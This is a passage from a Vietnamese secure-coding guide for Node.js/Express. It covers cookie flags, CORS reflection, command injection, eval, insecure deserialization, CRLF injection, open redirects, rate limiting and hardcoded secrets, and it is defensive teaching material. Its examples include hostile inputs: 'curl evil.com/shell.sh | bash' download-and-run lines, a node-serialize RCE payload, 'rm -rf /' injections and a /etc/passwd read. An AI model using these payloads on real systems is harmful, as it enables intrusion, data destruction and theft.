# Tìm res.cookie không có httpOnly
rg "res\.cookie\(" --type ts -n -A 5

# Tìm session config thiếu flags
rg "express-session|cookie-session" --type ts -n -A 10

# Tìm cookie setup trong app config
rg "cookie\s*:\s*\{" --type ts -n -A 8
```

### 6. Giải pháp

```typescript
import session from 'express-session'
import { CookieOptions, Response } from 'express'

// ❌ BAD: Cookie thiếu security flags
app.post('/login', (req, res) => {
  res.cookie('session', token)  // NGUY HIỂM: không có flags!
})

// ❌ BAD: Session config không đầy đủ
app.use(session({
  secret: 'weak-secret',
  cookie: {}  // NGUY HIỂM: thiếu tất cả flags
}))

// ✅ GOOD: Cookie với đầy đủ security flags
const COOKIE_OPTIONS: CookieOptions = {
  httpOnly: true,   // JavaScript không đọc được (chặn XSS steal)
  secure: process.env.NODE_ENV === 'production',  // chỉ HTTPS
  sameSite: 'strict', // chặn CSRF ('lax' cho OAuth flows)
  maxAge: 3600000,  // 1 giờ (ms)
  path: '/',
  domain: process.env.COOKIE_DOMAIN, // explicit domain
}

app.post('/login', (req: Request, res: Response) => {
  const token = generateToken(user)
  res.cookie('session', token, COOKIE_OPTIONS)
  res.json({ success: true })
})

// ✅ GOOD: Express-session config đầy đủ
app.use(session({
  name: '__Host-session',  // __Host- prefix: yêu cầu secure + path=/
  secret: process.env.SESSION_SECRET!,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: true,         // chỉ HTTPS
    sameSite: 'strict',  // chặn CSRF
    maxAge: 3600000,
  },
  // Dùng persistent store (không dùng MemoryStore trong production)
  store: new RedisStore({ client: redisClient }),
}))

// ✅ GOOD: Helmet để set security headers
import helmet from 'helmet'
app.use(helmet())
```

### 7. Phòng ngừa

```bash
npm install express-session connect-redis helmet
```

```typescript
// Kiểm tra cookie flags với jest
test('login response should have secure cookie', async () => {
  const res = await request(app).post('/login').send(validCreds)
  const setCookie = res.headers['set-cookie'][0]
  expect(setCookie).toContain('HttpOnly')
  expect(setCookie).toContain('Secure')
  expect(setCookie).toContain('SameSite=Strict')
})
```

---

## Pattern 09: CORS Wildcard With Credentials

### 1. Tên
**CORS Wildcard (`*`) Kết Hợp With Credentials**

### 2. Phân loại
- **Domain:** Cross-Origin Security / HTTP Headers
- **Subcategory:** CORS Misconfiguration, Credential Exposure

### 3. Mức nghiêm trọng
🟠 **HIGH** - Browser chặn theo spec nhưng cấu hình sai CORS vẫn cho phép domain độc hại gọi API với cookie/credentials của nạn nhân

### 4. Vấn đề

```
CORS WILDCARD + CREDENTIALS - BROWSER CHẶN:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
→ Browser từ chối (spec không cho phép kết hợp này)

NHƯNG: Dynamic origin reflection - NGUY HIỂM HƠN:
Request: Origin: https://evil.com
Response: Access-Control-Allow-Origin: https://evil.com  ← reflect!
          Access-Control-Allow-Credentials: true
→ evil.com có thể đọc response với cookie nạn nhân!

ATTACK FLOW:
1. Nạn nhân vào evil.com
2. evil.com gọi: fetch('https://api.yourapp.com/profile', {credentials: 'include'})
3. Browser gửi cookie của yourapp.com
4. Server reflect Origin → evil.com nhận được data!
```

### 5. Phát hiện

```bash
# Tìm CORS config với wildcard
rg "origin.*\*|allowedOrigins.*\*" --type ts -n

# Tìm CORS reflect origin pattern
rg "req\.headers\.origin" --type ts -n -A 3

# Tìm cors middleware config
rg "cors\(" --type ts -n -A 10

# Tìm Access-Control header set thủ công
rg "Access-Control-Allow-Origin" --type ts -n -A 2
```

### 6. Giải pháp

```typescript
import cors from 'cors'

// ❌ BAD: Wildcard với credentials
app.use(cors({
  origin: '*',
  credentials: true,  // NGUY HIỂM: browser chặn, nhưng còn các case khác
}))

// ❌ BAD: Reflect origin không validate
app.use((req, res, next) => {
  const origin = req.headers.origin
  res.header('Access-Control-Allow-Origin', origin)  // NGUY HIỂM!
  res.header('Access-Control-Allow-Credentials', 'true')
  next()
})

// ✅ GOOD: Whitelist origin cụ thể
const ALLOWED_ORIGINS = new Set([
  'https://app.yourcompany.com',
  'https://admin.yourcompany.com',
  ...(process.env.NODE_ENV === 'development' ? ['http://localhost:3000'] : []),
])

const corsOptions: cors.CorsOptions = {
  origin: (origin, callback) => {
    // Allow requests với no origin (mobile apps, Postman)
    if (!origin) {
      return callback(null, true)
    }

    if (ALLOWED_ORIGINS.has(origin)) {
      callback(null, true)
    } else {
      callback(new Error(`CORS blocked: ${origin}`))
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400,  // cache preflight 24h
}

app.use(cors(corsOptions))

// ✅ GOOD: Tách API public và private
// Public API (không cần credentials)
app.use('/api/public', cors({ origin: '*', credentials: false }))

// Private API (cần credentials, strict origin)
app.use('/api/private', cors(corsOptions))
```

### 7. Phòng ngừa

```bash
npm install cors
npm install --save-dev @types/cors
```

```typescript
// Test CORS trong integration tests
test('should block unknown origin', async () => {
  const res = await request(app)
    .get('/api/private/profile')
    .set('Origin', 'https://evil.com')
  expect(res.headers['access-control-allow-origin']).not.toBe('https://evil.com')
})
```

---

## Pattern 10: Command Injection (`child_process.exec`)

### 1. Tên
**Command Injection Qua `child_process.exec`**

### 2. Phân loại
- **Domain:** Injection / OS Command Execution
- **Subcategory:** Remote Code Execution (RCE), Shell Injection

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Attacker thực thi lệnh OS tuỳ ý trên server, toàn quyền kiểm soát hệ thống

### 4. Vấn đề

`child_process.exec` thực thi lệnh thông qua shell. Nếu có user input trong lệnh, attacker có thể inject thêm lệnh bằng `;`, `|`, `&&`, `` ` ``.

```
COMMAND INJECTION:
Code:   exec(`convert ${filename} output.pdf`)
Input:  filename = "image.jpg; rm -rf /"

Lệnh thực thi:
  convert image.jpg; rm -rf / output.pdf
                   ↑
               INJECT! xóa toàn bộ hệ thống!

Hoặc:
  filename = "img.jpg | curl evil.com/shell.sh | bash"
  → Download và chạy malware!

Hoặc:
  filename = "img.jpg `whoami > /tmp/out`"
  → Thực thi lệnh trong backtick
```

### 5. Phát hiện

```bash
# Tìm exec với template literal (dễ inject)
rg "exec\(`.*\$\{" --type ts -n
rg "exec\(.*\+.*req\." --type ts -n

# Tìm shell: true trong spawn
rg "shell\s*:\s*true" --type ts -n

# Tìm các hàm child_process
rg "child_process|exec\(|execSync\(" --type ts -n
```

### 6. Giải pháp

```typescript
import { exec, execFile, spawn } from 'child_process'
import { promisify } from 'util'

const execAsync = promisify(exec)

// ❌ BAD: Dùng exec với user input trực tiếp
app.post('/convert', async (req: Request, res: Response) => {
  const { filename } = req.body
  // NGUY HIỂM: thực thi qua shell, dễ inject
  await execAsync(`convert uploads/${filename} output/${filename}.pdf`)
})

// ❌ BAD: exec với string concatenation
const cmd = 'ffmpeg -i ' + userInput + ' output.mp4'
exec(cmd)  // NGUY HIỂM!

// ✅ GOOD: Dùng execFile - không qua shell, truyền args array
import { execFile } from 'child_process'
import { promisify } from 'util'
import path from 'path'

const execFileAsync = promisify(execFile)

async function convertFile(inputFilename: string): Promise<void> {
  // Validate filename - chỉ cho phép ký tự an toàn
  if (!/^[a-zA-Z0-9_\-\.]+\.(jpg|png|gif|webp)$/.test(inputFilename)) {
    throw new Error('Invalid filename')
  }

  const inputPath = path.join(UPLOAD_DIR, path.basename(inputFilename))
  const outputPath = path.join(OUTPUT_DIR, `${Date.now()}.pdf`)

  // execFile KHÔNG dùng shell → không thể inject
  // Mỗi argument là một phần tử riêng biệt
  await execFileAsync('convert', [
    inputPath,   // argument riêng, shell không parse
    outputPath
  ], {
    timeout: 30000,
    maxBuffer: 10 * 1024 * 1024
  })
}

// ✅ GOOD: Dùng spawn với stdio pipe, không shell
import { spawn } from 'child_process'

function spawnSafe(
  command: string,
  args: readonly string[],
  timeoutMs = 30000
): Promise<{ stdout: string; stderr: string }> {
  return new Promise((resolve, reject) => {
    const proc = spawn(command, args, {
      shell: false,  // KHÔNG dùng shell
      stdio: ['ignore', 'pipe', 'pipe'],
    })

    let stdout = ''
    let stderr = ''

    proc.stdout.on('data', (d) => stdout += d)
    proc.stderr.on('data', (d) => stderr += d)

    const timer = setTimeout(() => {
      proc.kill('SIGTERM')
      reject(new Error('Command timeout'))
    }, timeoutMs)

    proc.on('close', (code) => {
      clearTimeout(timer)
      if (code === 0) resolve({ stdout, stderr })
      else reject(new Error(`Command failed: ${code}`))
    })
  })
}
```

### 7. Phòng ngừa

```bash
# Tìm exec trong codebase
npm install --save-dev eslint-plugin-security
```

```json
{
  "rules": {
    "security/detect-child-process": "error",
    "security/detect-non-literal-require": "error"
  }
}
```

---

## Pattern 11: Eval / Function Constructor

### 1. Tên
**Eval và Function Constructor - Dynamic Code Execution**

### 2. Phân loại
- **Domain:** Code Injection / JavaScript Security
- **Subcategory:** Remote Code Execution (RCE), Sandbox Escape

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - Attacker thực thi JavaScript tuỳ ý trong Node.js process, toàn quyền hệ thống

### 4. Vấn đề

`eval()`, `new Function()`, `setTimeout(string)` thực thi string như code. Nếu string đến từ user input, đây là RCE hoàn toàn.

```
EVAL INJECTION:
code:   eval(`result = ${userInput}`)
input:  "process.exit(1)"
→      eval("result = process.exit(1)")
→      Server bị tắt!

input:  "require('child_process').execSync('rm -rf /')"
→      Xóa toàn bộ file system!

Function Constructor:
code:   const fn = new Function('return ' + userInput)
input:  "require('fs').readFileSync('/etc/passwd','utf8')"
→      fn()  ← đọc file nhạy cảm!
```

### 5. Phát hiện

```bash
# Tìm eval với variables (nguy hiểm)
rg "eval\(" --type ts --type js -n

# Tìm Function constructor
rg "new Function\(" --type ts --type js -n

# Tìm setTimeout/setInterval với string argument
rg "setTimeout\(.*['\"].*['\"]" --type ts -n
rg "setInterval\(.*['\"].*['\"]" --type ts -n

# Tìm vm module usage
rg "require\(['\"]vm['\"]|from ['\"]vm['\"]" --type ts -n
```

### 6. Giải pháp

```typescript
// ❌ BAD: eval với user input
app.post('/calculate', (req: Request, res: Response) => {
  const { formula } = req.body
  // NGUY HIỂM: formula có thể là bất kỳ JS code nào!
  const result = eval(formula)
  res.json({ result })
})

// ❌ BAD: new Function với user input
app.post('/transform', (req: Request, res: Response) => {
  const { code } = req.body
  const fn = new Function('data', code)  // NGUY HIỂM!
  const result = fn(userData)
  res.json({ result })
})

// ✅ GOOD: Dùng math library an toàn cho formula
import { evaluate } from 'mathjs'  // safe math expression evaluator

app.post('/calculate', (req: Request, res: Response) => {
  try {
    const { formula } = req.body
    if (typeof formula !== 'string' || formula.length > 1000) {
      return res.status(400).json({ error: 'Invalid formula' })
    }

    // mathjs chỉ evaluate toán học, không cho phép JS code
    const result = evaluate(formula)
    if (typeof result !== 'number') {
      return res.status(400).json({ error: 'Formula must return a number' })
    }
    res.json({ result })
  } catch (error) {
    res.status(400).json({ error: 'Invalid formula' })
  }
})

// ✅ GOOD: Nếu cần sandbox, dùng vm2 hoặc isolated-vm
import ivm from 'isolated-vm'

async function runInSandbox(userCode: string, data: unknown): Promise<unknown> {
  const isolate = new ivm.Isolate({ memoryLimit: 8 })  // 8MB limit
  const context = await isolate.createContext()
  const jail = context.global

  // Inject data, không inject Node.js APIs
  await jail.set('inputData', new ivm.ExternalCopy(data).copyInto())

  try {
    const script = await isolate.compileScript(
      `(function() { ${userCode} })()`
    )
    const result = await script.run(context, { timeout: 1000 })  // 1s timeout
    return result
  } finally {
    isolate.dispose()
  }
}

// ✅ GOOD: JSON.parse thay vì eval cho JSON
// const obj = eval('(' + jsonString + ')')  ← NGUY HIỂM
const obj = JSON.parse(jsonString)  // ← AN TOÀN
```

### 7. Phòng ngừa

```bash
npm install mathjs isolated-vm

# ESLint rule
```

```json
{
  "rules": {
    "no-eval": "error",
    "no-new-func": "error",
    "security/detect-eval-with-expression": "error"
  }
}
```

---

## Pattern 12: Insecure Deserialization

### 1. Tên
**Insecure Deserialization - Deserialize Không An Toàn**

### 2. Phân loại
- **Domain:** Data Processing / Object Injection
- **Subcategory:** RCE via Deserialization, Object Injection

### 3. Mức nghiêm trọng
🟠 **HIGH** - Có thể dẫn đến RCE, privilege escalation, hoặc data tampering

### 4. Vấn đề

Các thư viện serialize như `node-serialize`, `serialize-javascript` (nếu dùng sai) có thể execute code khi deserialize. Attacker craft payload đặc biệt để trigger code execution.

```
NODE-SERIALIZE RCE:
Malicious payload:
{
  "username": "_$$ND_FUNC$$_function(){
    require('child_process').exec('curl evil.com/shell|bash')
  }()"
}

unserialize(payload)
→ _$$ND_FUNC$$_ trigger IIFE (Immediately Invoked Function)
→ RCE!

JSON.parse với reviver:
const obj = JSON.parse(data, (key, value) => {
  if (key === 'fn') return eval(value)  ← NGUY HIỂM!
})
```

### 5. Phát hiện

```bash
# Tìm node-serialize usage
rg "node-serialize|unserialize" --type ts -n

# Tìm JSON.parse với reviver function
rg "JSON\.parse\(.*function|JSON\.parse.*=>" --type ts -n

# Tìm Buffer.from với user input (binary deserialize)
rg "Buffer\.from.*req\." --type ts -n

# Tìm msgpack, pickle equivalent libraries
rg "msgpack|bson|yaml\.load\b" --type ts -n
```

### 6. Giải pháp

```typescript
// ❌ BAD: Dùng node-serialize với user input
import serialize from 'node-serialize'

app.post('/restore', (req: Request, res: Response) => {
  const data = req.body.serializedData
  // NGUY HIỂM: _$$ND_FUNC$$_ sẽ execute code!
  const obj = serialize.unserialize(data)
  res.json(obj)
})

// ❌ BAD: YAML.load với user input (YAML có thể chứa JS tags)
import yaml from 'js-yaml'

const config = yaml.load(userInput)  // NGUY HIỂM: có thể exec code

// ✅ GOOD: Chỉ dùng JSON.parse (không exec code)
app.post('/restore', (req: Request, res: Response) => {
  try {
    const data = req.body.serializedData
    if (typeof data !== 'string' || data.length > 1_000_000) {
      return res.status(400).json({ error: 'Invalid data' })
    }

    // JSON.parse an toàn, không exec code
    const obj = JSON.parse(data)

    // Validate schema sau khi parse
    const validated = userDataSchema.parse(obj)
    res.json(validated)
  } catch {
    res.status(400).json({ error: 'Invalid data format' })
  }
})

// ✅ GOOD: YAML safeLoad thay vì load
import yaml from 'js-yaml'

// NGUY HIỂM: yaml.load() - có thể exec code qua custom types
// AN TOÀN: yaml.safeLoad() hoặc yaml.load() với schema giới hạn
const config = yaml.load(userInput, {
  schema: yaml.FAILSAFE_SCHEMA,  // chỉ string, arrays, objects
})

// ✅ GOOD: Dùng superjson hoặc zod để deserialize an toàn
import superjson from 'superjson'
import { z } from 'zod'

const schema = z.object({
  name: z.string(),
  age: z.number(),
  createdAt: z.date(),
})

const parsed = superjson.parse<z.infer<typeof schema>>(userInput)
const validated = schema.parse(parsed)  // double validation
```

### 7. Phòng ngừa

```bash
# Không dùng node-serialize với user input
npm uninstall node-serialize

# Dùng js-yaml safeLoad
npm install js-yaml
# Đọc docs: chỉ dùng FAILSAFE_SCHEMA hoặc JSON_SCHEMA với user input

npm audit  # kiểm tra serialization vulnerabilities
```

---

## Pattern 13: Header Injection (CRLF)

### 1. Tên
**HTTP Response Splitting / CRLF Header Injection**

### 2. Phân loại
- **Domain:** HTTP Protocol / Response Manipulation
- **Subcategory:** Response Splitting, Cache Poisoning, XSS via Headers

### 3. Mức nghiêm trọng
🟠 **HIGH** - Attacker inject HTTP headers tuỳ ý, gây cache poisoning, XSS, hoặc phishing

### 4. Vấn đề

HTTP headers kết thúc bằng `\r\n` (CRLF). Nếu user input được dùng trong header mà không sanitize, attacker có thể inject thêm headers hoặc tạo response body mới.

```
CRLF INJECTION:
Code:   res.setHeader('Location', req.query.redirect)
Input:  /safe\r\nSet-Cookie: session=evil123\r\n

HTTP Response:
HTTP/1.1 302 Found
Location: /safe
Set-Cookie: session=evil123    ← INJECTED!
Content-Type: text/html

Hoặc inject Content-Type + body:
Input: /safe\r\n\r\n<script>alert(1)</script>

HTTP Response:
HTTP/1.1 302 Found
Location: /safe
                               ← blank line = body bắt đầu!
<script>alert(1)</script>      ← XSS!
```

### 5. Phát hiện

```bash
# Tìm setHeader với user input
rg "setHeader\(.*req\.(query|body|params)" --type ts -n

# Tìm Location redirect với user input
rg "res\.(redirect|location)\(.*req\." --type ts -n

# Tìm header set với dynamic value
rg "res\.header\(" --type ts -n -A 2
```

### 6. Giải pháp

```typescript
// ❌ BAD: Dùng user input trực tiếp trong header
app.get('/redirect', (req: Request, res: Response) => {
  const redirectUrl = req.query.to as string
  // NGUY HIỂM: URL có thể chứa \r\n
  res.setHeader('Location', redirectUrl)
  res.status(302).end()
})

// ❌ BAD: User input trong custom header
app.get('/api', (req: Request, res: Response) => {
  const requestId = req.query.requestId as string
  // NGUY HIỂM nếu requestId chứa CRLF
  res.setHeader('X-Request-Id', requestId)
})

// ✅ GOOD: Strip CRLF và validate trước khi set header
function sanitizeHeaderValue(value: string): string {
  // Loại bỏ CRLF, null bytes, và ký tự control
  return value.replace(/[\r\n\0]/g, '').trim()
}

function isValidRedirectUrl(url: string, allowedDomains: string[]): boolean {
  try {
    const parsed = new URL(url, 'https://yourapp.com')
    return allowedDomains.includes(parsed.hostname)
  } catch {
    // Relative URL
    return url.startsWith('/') && !url.startsWith('//')
  }
}

const ALLOWED_REDIRECT_DOMAINS = ['yourapp.com', 'app.yourapp.com']

app.get('/redirect', (req: Request, res: Response) => {
  const rawUrl = req.query.to as string ?? '/'

  if (!isValidRedirectUrl(rawUrl, ALLOWED_REDIRECT_DOMAINS)) {
    return res.redirect('/')
  }

  // sanitize để chắc chắn không có CRLF
  const safeUrl = sanitizeHeaderValue(rawUrl)
  res.redirect(safeUrl)
})

// ✅ GOOD: Request ID - chỉ cho phép alphanumeric
app.get('/api', (req: Request, res: Response) => {
  const rawId = req.query.requestId as string ?? ''
  // Chỉ cho phép ký tự an toàn
  const safeId = rawId.replace(/[^a-zA-Z0-9\-_]/g, '').substring(0, 64)
  res.setHeader('X-Request-Id', safeId)
})
```

### 7. Phòng ngừa

```bash
# Node.js >= 14 có built-in protection nhưng không đủ
# Luôn sanitize thủ công

npm install validator  # String sanitization utilities
```

```json
{
  "rules": {
    "security/detect-possible-timing-attacks": "warn"
  }
}
```

---

## Pattern 14: Open Redirect

### 1. Tên
**Open Redirect - Chuyển Hướng Mở Không Kiểm Soát**

### 2. Phân loại
- **Domain:** Input Validation / Business Logic
- **Subcategory:** Phishing, OAuth Token Theft, Credential Harvesting

### 3. Mức nghiêm trọng
🟡 **MEDIUM** - Dùng để phishing, bypass SSO security, đánh cắp OAuth tokens

### 4. Vấn đề

```
OPEN REDIRECT ATTACK:
Legit URL: https://yourapp.com/login?redirect=/dashboard
Malicious: https://yourapp.com/login?redirect=https://evil.com/fake-login

User thấy URL bắt đầu bằng yourapp.com → tin tưởng
Sau login → redirect đến evil.com
evil.com trông giống yourapp.com → nhập password → bị đánh cắp!

OAuth Token Theft:
https://yourapp.com/oauth/callback?code=xxx&redirect_uri=https://evil.com
→ Authorization code bị gửi đến evil.com!
```

### 5. Phát hiện

```bash
# Tìm redirect với query parameter
rg "res\.redirect\(.*req\.(query|body|params)" --type ts -n

# Tìm window.location set với user input (frontend)
rg "window\.location\s*=.*req\." --type ts -n

# Tìm returnUrl, redirectUrl, next parameters
rg "returnUrl|redirectUrl|returnTo|next|redirect" --type ts -n -A 2
```

### 6. Giải pháp

```typescript
// ❌ BAD: Redirect trực tiếp đến URL từ query param
app.get('/login', (req: Request, res: Response) => {
  // NGUY HIỂM: redirect có thể là https://evil.com
  const redirectUrl = req.query.redirect as string
  if (authenticateUser(req)) {
    res.redirect(redirectUrl ?? '/dashboard')
  }
})

// ✅ GOOD: Chỉ cho phép redirect đến relative URL hoặc whitelist domain
const ALLOWED_REDIRECT_HOSTS = new Set([
  'yourapp.com',
  'app.yourapp.com',
])

function getSafeRedirectUrl(rawUrl: string | undefined, defaultUrl = '/'): string {
  if (!rawUrl) return defaultUrl

  try {
    // Nếu là absolute URL, kiểm tra domain
    const parsed = new URL(rawUrl)
    if (ALLOWED_REDIRECT_HOSTS.has(parsed.hostname)) {
      return rawUrl
    }
    // Domain không được phép → redirect về default
    return defaultUrl
  } catch {
    // Không parse được URL → đây là relative URL
    // Chỉ cho phép relative URL bắt đầu bằng /
    if (rawUrl.startsWith('/') && !rawUrl.startsWith('//')) {
      // Kiểm tra thêm: không có newline (CRLF injection)
      if (!/[\r\n]/.test(rawUrl)) {
        return rawUrl
      }
    }
    return defaultUrl
  }
}

app.get('/login', (req: Request, res: Response) => {
  const rawRedirect = req.query.redirect as string
  const safeRedirect = getSafeRedirectUrl(rawRedirect, '/dashboard')

  if (authenticateUser(req)) {
    res.redirect(safeRedirect)
  }
})
```

### 7. Phòng ngừa

```typescript
// Test open redirect
test('should not redirect to external URL', async () => {
  const res = await request(app)
    .get('/login?redirect=https://evil.com')
    .send(validCreds)
  expect(res.headers.location).not.toContain('evil.com')
  expect(res.headers.location).toBe('/dashboard')
})
```

---

## Pattern 15: Rate Limiting Thiếu

### 1. Tên
**Rate Limiting Không Đủ - Brute Force và DOS**

### 2. Phân loại
- **Domain:** Availability / Authentication Security
- **Subcategory:** Brute Force Attack, Credential Stuffing, API Abuse

### 3. Mức nghiêm trọng
🟠 **HIGH** - Attacker brute force password, OTP, chiếm tài khoản hàng loạt, hoặc gây DOS

### 4. Vấn đề

```
BRUTE FORCE WITHOUT RATE LIMIT:
for i in 1..1000000:
    POST /login {"username": "admin", "password": passwords[i]}
    → Thử 1 triệu password trong vài phút
    → Tìm ra password!

OTP Brute Force:
for i in 000000..999999:
    POST /verify-otp {"otp": i}
    → 1 triệu OTP, chỉ có 1 đúng
    → Chiếm tài khoản trong <1 giờ!

CREDENTIAL STUFFING:
Có list: email:password từ data breach
→ Thử 1M cặp email/password trong vài giờ
→ Chiếm hàng nghìn tài khoản có reused password
```

### 5. Phát hiện

```bash
# Tìm endpoint login không có rate limit middleware
rg "app\.(post|get)\(['\"]\/login" --type ts -n -B 5

# Tìm express-rate-limit setup
rg "rateLimit|rate-limit|express-rate-limit" --type ts -n

# Tìm OTP/2FA endpoint không có rate limit
rg "\/verify|\/otp|\/reset-password" --type ts -n -B 3
```

### 6. Giải pháp

```typescript
import rateLimit from 'express-rate-limit'
import RedisStore from 'rate-limit-redis'
import { createClient } from 'redis'

const redisClient = createClient({ url: process.env.REDIS_URL })

// ❌ BAD: Không có rate limiting
app.post('/login', async (req: Request, res: Response) => {
  const { email, password } = req.body
  const user = await authenticateUser(email, password)
  // Không giới hạn số lần thử → brute force dễ dàng
})

// ✅ GOOD: Rate limit theo IP và theo account
const loginRateLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 phút
  max: 10,                    // tối đa 10 lần thử per IP
  standardHeaders: true,
  legacyHeaders: false,
  message: { error: 'Too many login attempts, try again in 15 minutes' },
  store: new RedisStore({     // Redis store cho multi-instance
    sendCommand: (...args: string[]) => redisClient.sendCommand(args),
  }),
  // Key theo IP (default) hoặc kết hợp IP + username
  keyGenerator: (req) => {
    const ip = req.ip ?? 'unknown'
    const username = req.body?.username ?? ''
    return `login:${ip}:${username}`
  },
  skip: (req) => {
    // Không rate limit từ internal health checks
    return req.ip === '127.0.0.1' && req.path === '/health'
  }
})

// Rate limit cho OTP (nghiêm ngặt hơn)
const otpRateLimiter = rateLimit({
  windowMs: 10 * 60 * 1000,  // 10 phút
  max: 5,                     // chỉ 5 lần thử OTP
  store: new RedisStore({ sendCommand: (...args) => redisClient.sendCommand(args) }),
})

// Rate limit chung cho API
const apiRateLimiter = rateLimit({
  windowMs: 60 * 1000,   // 1 phút
  max: 100,              // 100 request/phút/IP
  store: new RedisStore({ sendCommand: (...args) => redisClient.sendCommand(args) }),
})

app.use('/api/', apiRateLimiter)
app.post('/login', loginRateLimiter, loginHandler)
app.post('/verify-otp', otpRateLimiter, otpHandler)

// ✅ GOOD: Exponential backoff với account lockout
import { Redis } from 'ioredis'

const redis = new Redis(process.env.REDIS_URL!)

async function checkLoginAttempts(email: string): Promise<void> {
  const key = `failed_login:${email}`
  const attempts = parseInt(await redis.get(key) ?? '0')

  if (attempts >= 10) {
    throw new Error('Account temporarily locked. Try again later.')
  }
}

async function recordFailedLogin(email: string): Promise<void> {
  const key = `failed_login:${email}`
  const current = await redis.incr(key)
  if (current === 1) {
    await redis.expire(key, 30 * 60)  // reset sau 30 phút
  }
}

async function clearFailedLogins(email: string): Promise<void> {
  await redis.del(`failed_login:${email}`)
}
```

### 7. Phòng ngừa

```bash
npm install express-rate-limit rate-limit-redis ioredis

# Thêm rate limit vào tất cả sensitive endpoints
# Kiểm tra bằng k6 hoặc artillery
npm install -g artillery
artillery quick --count 100 -n 10 http://localhost:3000/login
```

---

## Pattern 16: Secret In Source Code

### 1. Tên
**Secret Hardcoded Trong Source Code**

### 2. Phân loại
- **Domain:** Secrets Management / Configuration Security
- **Subcategory:** Credential Exposure, API Key Leak, Git History Exposure

### 3. Mức nghiêm trọng
🔴 **CRITICAL** - API keys, database passwords, JWT secrets bị lộ vĩnh viễn qua Git history; bị automated scanners phát hiện trong phút

### 4. Vấn đề

```
SECRET EXPOSURE TIMELINE:
t=0     : Developer commit: const DB_PASS = "Prod@123"
t=1min  : GitHub push → GitGuardian/TruffleHog quét
t=2min  : Alert: Secret detected!
t=5min  : Automated bots quét GitHub public repos
t=10min : Credential bị dùng để xâm nhập database
t=...   : Data breach

NGAY CẢ KHI XÓA COMMIT - VẪN CÒN TRONG GIT HISTORY:
git log --all -S "Prod@123"  → vẫn tìm thấy!
git clone && git log --all   → full history có secret!
```

### 5. Phát hiện

```bash
# Tìm hardcoded credentials phổ biến
rg "(password|passwd|pwd)\s*=\s*['\"][^'\"]{4,}['\"]" --type ts -ni
rg "(api_key|apikey|api-key)\s*=\s*['\"][^'\"]{8,}['\"]" --type ts -ni
rg "(secret|token)\s*=\s*['\"][^'\"]{8,}['\"]" --type ts -ni

# Tìm connection string với password
rg "mongodb\+srv://.*:.*@|postgresql://.*:.*@|mysql://.*:.*@" --type ts -n

# Tìm AWS keys
rg "AKIA[0-9A-Z]{16}|aws_secret" --type ts -n

# Tìm private key patterns
rg "-----BEGIN.*PRIVATE KEY-----" -n

# Dùng trufflehog để quét toàn bộ git history
# trufflehog git file://. --only-verified
```

### 6. Giải pháp

```typescript
// ❌ BAD: Hardcode mọi loại secret
const config = {
  database: {
    password: 'Prod@123',          // NGUY HIỂM!
    host: 'db.internal.company.com'
  },
  jwt: {
    secret: 'my-super-secret-key'  // NGUY HIỂM!
  },
  aws: {
    accessKeyId: 'AKIAIOSFODNN7EXAMPLE',     // NGUY HIỂM!
    secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'
  },
  stripe: {
    secretKey: 'sk_live_51abc...'  // NGUY HIỂM!
  }
}

// ✅ GOOD: Tất cả secret từ environment variables
import { z } from 'zod'

// Define và validate env vars khi startup
const envSchema = z.object({
  NODE_ENV: z.enum(['development', 'test', 'production']),
  DATABASE_URL: z.string().url(),
  JWT_SECRET: z.string().min(64),
  AWS_ACCESS_KEY_ID: z.string().optional(),
  AWS_SECRET_ACCESS_KEY: z.string().optional(),
  STRIPE_SECRET_KEY: z.string().startsWith('sk_'),
  REDIS_URL: z.string().url(),
})

// Fail fast nếu thiếu env var - không chạy với config không đầy đủ
const parseResult = envSchema.safeParse(process.env)
if (!parseResult.success) {
  console.error('Missing or invalid environment variables:')
  console.error(parseResult.error.format())
  process.exit(1)
}

export const env = parseResult.data

// Sử dụng
import { env } from './config/env'
const db = new Database({ url: env.DATABASE_URL })

// ✅ GOOD: .env.example - template không có giá trị thật
// .env.example (commit vào git)
/*
NODE_ENV=development
DATABASE_URL=postgresql://user:password@localhost:5432/mydb
JWT_SECRET=<generate with: node -e "console.log(require('crypto').randomBytes(64).toString('hex'))">
STRIPE_SECRET_KEY=sk_test_...
REDIS_URL=redis://localhost:6379
*/

// .env (KHÔNG commit vào git - thêm vào .gitignore)
/*
NODE_ENV=production
DATABASE_URL=postgresql://prod_user:ActualProdPassword@prod-db:5432/mydb
JWT_SECRET=a3f8b2c1d4e5f6...actual-64-char-secret
*/

// ✅ GOOD: Nếu secret đã bị commit - rotate ngay lập tức!
// 1. Thay đổi tất cả secret trên các service
// 2. Dùng git filter-branch hoặc BFG để xóa khỏi history
// BFG: bfg --replace-text secrets.txt repo.git
// 3. Force push (cần coordination với team)
// 4. Thông báo security incident
```

### 7. Phòng ngừa

```bash
# 1. Thêm vào .gitignore
echo ".env" >> .gitignore
echo ".env.local" >> .gitignore
echo ".env.*.local" >> .gitignore
echo "*.pem" >> .gitignore
echo "*.key" >> .gitignore

# 2. Cài pre-commit hook để chặn commit secret
npm install --save-dev detect-secrets
# pip install detect-secrets
# detect-secrets scan > .secrets.baseline
# pre-commit hook: detect-secrets-hook --baseline .secrets.baseline

# 3. Dùng git-secrets hoặc gitleaks
# brew install gitleaks
# gitleaks detect --source . -v

# 4. Dùng secret management service
# - AWS Secrets Manager
# - HashiCorp Vault
# - Azure Key Vault
npm install @aws-sdk/client-secrets-manager
```

```json
// ESLint: detect potential hardcoded credentials
{
  "plugins": ["no-secrets"],
  "rules": {
    "no-secrets/no-secrets": ["error", { "tolerance": 4.2 }]
  }
}
```

```bash
# Audit toàn bộ git history
trufflehog git file://. --only-verified --fail
# hoặc
gitleaks detect --source . --report-format json --report-path findings.json
```

---

## Tóm Tắt Mức Độ Nghiêm Trọng

| Pattern | Tên | Mức Độ | Tác Động Chính |
|---------|-----|--------|----------------|
| 01 | NoSQL Injection | 🔴 CRITICAL | Bypass auth, data theft |
| 02 | XSS via EJS `<%-` | 🔴 CRITICAL | Session hijacking, account takeover |
| 03 | Prototype Pollution | 🔴 CRITICAL | RCE, auth bypass |
| 04 | ReDoS | 🔴 CRITICAL | DOS toàn bộ server |
